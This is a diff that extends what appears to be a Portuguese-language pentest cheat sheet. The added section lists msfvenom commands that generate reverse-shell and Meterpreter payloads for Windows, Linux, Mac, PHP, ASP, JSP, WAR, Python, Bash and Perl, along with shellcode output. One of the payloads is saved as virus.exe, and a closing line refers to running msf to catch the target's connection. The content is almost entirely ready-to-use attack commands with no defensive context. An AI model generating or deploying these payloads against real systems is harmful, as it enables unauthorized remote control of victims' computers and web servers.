@@ -16,6 +16,87 @@ Gerando payload para Windows:
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=443 -f exe > virus.exe
 ```
 
+Gerando payload para Linux:
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<SEU IP> LPORT=<SUA PORTA> -f elf > shell.elf
+```
+
+Gerando payload para Mac:
+
+```bash
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Seu IP> LPORT=<Sua Porta> -f macho > shell.macho
+```
+
+Payload’s para servidores WEB
+
+PHP
+
+```bash
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Seu IP> LPORT=<Sua Porta> -f raw > shell.php
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+```
+
+ASP
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Seu IP> LPORT=<Sua Porta> -f asp > shell.asp
+```
+
+JSP
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Seu IP> LPORT=<Sua Porta> -f raw > shell.jsp
+```
+
+WAR
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Seu IP> LPORT=<Sua Porta> -f war > shell.war
+```
+
+Payload’s Adicionais
+
+Python
+
+```bash
+msfvenom -p cmd/unix/reverse_python LHOST=<Seu IP> LPORT=<Sua Porta> -f raw > shell.py
+```
+
+Bash
+
+```bash
+msfvenom -p cmd/unix/reverse_bash LHOST=<Seu IP> LPORT=<Sua Porta> -f raw > shell.sh
+```
+
+Perl
+
+```bash
+msfvenom -p cmd/unix/reverse_perl LHOST=<Seu IP> LPORT=<Sua Porta> -f raw > shell.pl
+```
+
+Shellcode
+
+Para todos os códigos de shell, consulte 'msfvenom --help-formatos' para obter informações sobre parâmetros válidos. O msfvenom produzirá um código que pode ser recortado e colado nessa linguagem para suas explorações.
+
+Linux Based Shellcode
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+```
+
+Windows Based Shellcode
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+```
+
+Mac Based Shellcode
+
+```bash
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+```
+
 Para receber a conexão do alvo será necessário que o msf esteja em execução:
 
 ```bash
